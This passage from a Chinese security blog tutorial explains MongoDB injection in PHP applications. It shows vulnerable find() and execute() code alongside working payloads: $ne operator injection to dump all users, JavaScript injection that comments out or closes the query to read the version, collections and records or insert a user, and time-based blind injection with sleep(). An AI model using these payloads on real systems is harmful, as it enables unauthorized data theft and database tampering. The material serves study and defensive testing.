<span class="hljs-variable">$data</span> = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'username'</span>=&gt;<span class="hljs-variable">$username</span>,
        <span class="hljs-string">'password'</span>=&gt;<span class="hljs-variable">$password</span>
        );
<span class="hljs-variable">$data</span> = <span class="hljs-variable">$coll</span>-&gt;<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-variable">$data</span>);
<span class="hljs-variable">$count</span> = <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">count</span>();
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$count</span>&gt;<span class="hljs-number">0</span>) {
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$user</span>) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'username:'</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">'username'</span>].<span class="hljs-string">"&lt;/br&gt;"</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'password:'</span>.<span class="hljs-variable">$user</span>[<span class="hljs-string">'password'</span>].<span class="hljs-string">"&lt;/br&gt;"</span>;
    }
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'未找到'</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>当我们用公共用户test输入时，显示出username和password：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015114522868.png" alt="image-20231015114522868"></p>
<p>分析一下，这里我输入的是<code>?username=test&amp;password=test</code>，然后进入到MongoDB中的语句其实为<code>db.test.find({username:'test',password:'test'});</code>。</p>
<p>若此时我们以PHP数组的形式输入<code>?username[a]=test&amp;password=test</code>，源码中$data的值便为：</p>
<pre><code class="hljs sql">$data <span class="hljs-operator">=</span> <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'username'</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-keyword">array</span>(<span class="hljs-string">'a'</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">'test'</span>),
        <span class="hljs-string">'password'</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span><span class="hljs-string">'test'</span>
        );</code></pre>
<p>最后实际MongoDB执行的语句为<code>db.test.find({username:{a:'test'},password:'test'});</code>。</p>
<p>因此，我们就可以利用这个特性往数组的键名传递一个操作符（大于，小于，等于，不等于等等），从而达到利用的目的：</p>
<pre><code class="hljs http">?username[$ne]=1&amp;password[$ne]=1</code></pre>
<p>$ne即not equal不等于，转换到MongoDB语句即为：</p>
<pre><code class="hljs sqlite">db.test.find({username:{'$ne':'1'},password:{'$ne':'1'}});</code></pre>
<p>而该语句相当于：</p>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> username<span class="hljs-operator">!=</span><span class="hljs-string">'1'</span> <span class="hljs-keyword">and</span> password<span class="hljs-operator">!=</span><span class="hljs-string">'1'</span>;</code></pre>
<p>直接爆出了所有数据库用户信息：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015114632550.png" alt="image-20231015114632550"></p>
<h3 id="532-execute执行拼接字符串导致的注入联合查询注入">5.3.2 execute()执行拼接字符串导致的注入/联合查询注入</h3>
<p>代码如下，为了方便查看注入的语句，我这里添加了输出查询语句：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'username'</span>];
<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'password'</span>];
<span class="hljs-variable">$query</span> = <span class="hljs-string">"var data = db.test.findOne({username:'<span class="hljs-subst">$username</span>',password:'<span class="hljs-subst">$password</span>'});return data;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$query</span>.<span class="hljs-string">'&lt;br&gt;'</span>;
<span class="hljs-variable">$mongo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoClient</span>();
<span class="hljs-variable">$db</span> = <span class="hljs-variable">$mongo</span>-&gt;test;
<span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$query</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">'ok'</span>] == <span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$data</span>[<span class="hljs-string">'retval'</span>]!=<span class="hljs-literal">NULL</span>) {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'username:'</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">'retval'</span>][<span class="hljs-string">'username'</span>].<span class="hljs-string">"&lt;/br&gt;"</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'password:'</span>.<span class="hljs-variable">$data</span>[<span class="hljs-string">'retval'</span>][<span class="hljs-string">'password'</span>].<span class="hljs-string">"&lt;/br&gt;"</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'未找到'</span>;
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$data</span>[<span class="hljs-string">'errmsg'</span>];
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看到，是直接拼接起来的字符串然后传入execute()函数中执行。</p>
<p>正常访问：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120642489.png" alt="image-20231015120642489"></p>
<p>添加个单引号试试，发现会报错：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120649925.png" alt="image-20231015120649925"></p>
<p>此时可以利用注释或闭合的方法针对性地实现注入就可以了。</p>
<h4 id="利用注释">利用注释</h4>
<p>按照输出的提示语句以及报错信息逐个尝试，目的是成功注释掉后面的password部分语句并返回成功，当输入如下payload时成功返回：</p>
<pre><code class="hljs http">?username=test'});return true;})//&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120741891.png" alt="image-20231015120741891"></p>
<p>这里返回username和password两项，按照MongoDB数据的Json格式，我们可以让其返回Json键值对看看：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120758248.png" alt="image-20231015120758248"></p>
<p>没问题，剩下的就是各种payload尝试了。</p>
<p>爆数据库版本：</p>
<pre><code class="hljs http">?username=test'});return {username:db.version(),password:1};})//&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120835290.png" alt="image-20231015120835290"></p>
<p>爆当前数据库所有集合，这里因为db.getCollectionNames()返回的是数组、需要用tojson()转换为字符串，另外MongoDB函数区分大小写：</p>
<pre><code class="hljs http">?username=test'});return {username:tojson(db.getCollectionNames()),password:1};})//&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120913560.png" alt="image-20231015120913560"></p>
<p>爆其他集合第一条数据，我这里本地新建user集合并插入文档，若想继续遍历爆其他信息只需修改数组下标即可：</p>
<pre><code class="hljs http">?username=test'});return {username:tojson(db.user.find()[0]),password:1};})//&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015120948575.png" alt="image-20231015120948575"></p>
<p>往user集合插入新用户数据：</p>
<pre><code class="hljs http">?username=test'});return {username:db.user.insert({'username':'mi1k7ea','password':'mi1k7ea'}),password:1};})//&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015121028062.png" alt="image-20231015121028062"></p>
<h4 id="利用闭合">利用闭合</h4>
<p>构造如下payload，用于闭合后面的语句使语法正确：</p>
<pre><code class="hljs http">?username=test'});return {username:db.version(),password:1};var b=({a:'1&amp;password=test</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015121125642.png" alt="image-20231015121125642"></p>
<p>剩下的其他利用和前面的一样，这里只说个重点的，在无回显的情况下，我们就需要用到盲注技巧，这里用到的盲注是基于时间的盲注，在高版本下MongoDB添加了sleep()函数，我们利用这个sleep()函数和闭合的技巧来实现基于时间的盲注（这种盲注技巧仅在闭合的情况下可行，本人在注释的情况下并未成功）：</p>
<pre><code class="hljs http">?username=test'});if (db.version()&gt;"0"){sleep(10000);exit;}var b=({a:'1&amp;password=test</code></pre>
<p>若数据库版本大于0，则sleep 10s：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20231015121203275.png" alt="image-20231015121203275"></p>
<p>剩下的就是进阶的了，可参考下面的</p>
<h1 id="0x06-总结">0x06 总结</h1>
<p>emmm本次文章呢，旨在初步了解各种常用数据库的常规注入语句，进阶的内容的很少（但我心里认为还是有必要深度学习一下的）不过我感觉学好MySQL的话也是很有帮助的，剩下的可以遇到的时候百度什么的。</p>
<p>本文呢也只是简单总结一下，copy rate is 99.9999999999…%（我也不想啊，太菜了，遇到不会的知识，以目前的我根本没能力写出高质量的文章（也就是用自己的语言以及思考去写），只得抄袭众多大佬的，但希望这些知识可以变成自己的，不论如何我都会努力提升自己，在日后提升文章质量（毕竟只有这样，我认为才学的深刻吧），本文也会一直更新（难免实战遇到来更新一下）。</p>
<p>加油！！</p>
<h1 id="0x07-参考文章">0x07 参考文章</h1>
<h2 id="mssql参考">mssql参考</h2>
<p><a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#42-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5">MSSQL 注入与提权方法整理</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TheTai/p/14371392.html">Mysql 隐式类型转换</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/mssql-injection-learn/">MSSQL 注入学习笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://macchiato.ink/web/web_security/mssql_injection_setup/">MSSQL注入环境搭建</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/286862.html">渗透测试之基础篇：Microsoft SQL Server手注之联合查询注入</a> --靶场实战参考</p>
<h2 id="postgresql参考">postgresql参考</h2>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">postgresql注入</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E8%BD%AF%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/%E5%AE%9E%E9%AA%8C/PostgreSQL.md">[PostgreSQL]</a></p>
<h2 id="oracle参考">Oracle参考</h2>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/oracle-sql-inject/">Oracle SQL注入学习</a>  --含提权</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7897">关于学习Oracle注入</a></p>
<p><a target="_blank" rel="noopener" href="https://johnfrod.top/%E5%AE%89%E5%85%A8/oracle%E6%B3%A8%E5%85%A5/">[Oracle注入]</a></p>
<p><a target="_blank" rel="noopener" href="https://550532788.github.io/2020/08/10/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84Oracle%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">从零开始的Oracle注入学习</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></p>
<h2 id="mongodb参考">MongoDB参考</h2>
<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x04-PHP-MongoDB%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">NoSQL注入之MongoDB</a></p>
<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/02/27/MongoDB%E6%B3%A8%E5%85%A5/">MongoDB注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#">MongoDB 注入指北 丨</a></p>
<p><a target="_blank" rel="noopener" href="http://drops.wooyun.org/tips/3939">http://drops.wooyun.org/tips/3939</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/')">sql注入学习--拓展</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=sql注入学习--拓展&amp;url=http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/10/12/newstarctf-2023/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NewStarCTF 2023</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/15/web-php-wrong-nginx-config/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web_php_wrong_nginx_config</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-msssql"><span class="toc-number">2.</span> <span class="toc-text">0x02 Msssql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E8%87%AA%E5%B8%A6%E5%BA%93%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 自带库介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E5%9F%BA%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 基本注入流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#29-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.9.</span> <span class="toc-text">2.9 时间盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-postgresql"><span class="toc-number">3.</span> <span class="toc-text">0x03 PostgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#31-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#32-%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 验证注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#33-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#34-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">3.4 时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">3.5.</span> <span class="toc-text">3.5  堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.6.</span> <span class="toc-text">3.6 联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%BC%8F%E5%90%8D%E7%A7%B0schemaname%E5%90%8D%E7%A7%B0"><span class="toc-number">3.6.0.1.</span> <span class="toc-text">获取模式名称（schemaname）名称</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E8%A1%A8%E5%90%8D%E7%A7%B0"><span class="toc-number">3.6.1.</span> <span class="toc-text">获取数据表名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D%E7%A7%B0"><span class="toc-number">3.6.2.</span> <span class="toc-text">获取表字段名称</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%86%85%E5%AE%B9"><span class="toc-number">3.6.3.</span> <span class="toc-text">获取表内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C"><span class="toc-number">3.7.</span> <span class="toc-text">3.7 文件或目录操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95%E5%8F%AA%E8%83%BD%E5%88%97%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.1.</span> <span class="toc-text">列目录——只能列安装目录下的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.2.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">3.7.3.</span> <span class="toc-text">写文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-oracle"><span class="toc-number">4.</span> <span class="toc-text">0x04 Oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#41-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">4.2 基本语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">4.3.</span> <span class="toc-text">4.3 信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.4.</span> <span class="toc-text">4.4 注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#441-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">4.4.1.</span> <span class="toc-text">4.4.1 联合查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.5.</span> <span class="toc-text">4.5 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#451-utl_inaddrget_host_name"><span class="toc-number">4.5.1.</span> <span class="toc-text">4.5.1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#452-ctxsysdrithsxsn"><span class="toc-number">4.5.2.</span> <span class="toc-text">4.5.2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#453-ctxsysctx_reporttoken_type"><span class="toc-number">4.5.3.</span> <span class="toc-text">4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#454-xmltype"><span class="toc-number">4.5.4.</span> <span class="toc-text">4.5.4 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#456-dbms_xdb_versioncheckin"><span class="toc-number">4.5.5.</span> <span class="toc-text">4.5.6 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#457-dbms_xdb_versionmakeversioned"><span class="toc-number">4.5.6.</span> <span class="toc-text">4.5.7 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#458-dbms_xdb_versionuncheckout"><span class="toc-number">4.5.7.</span> <span class="toc-text">4.5.8 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#459-dbms_utilitysqlid_to_sqlhash"><span class="toc-number">4.5.8.</span> <span class="toc-text">4.5.9 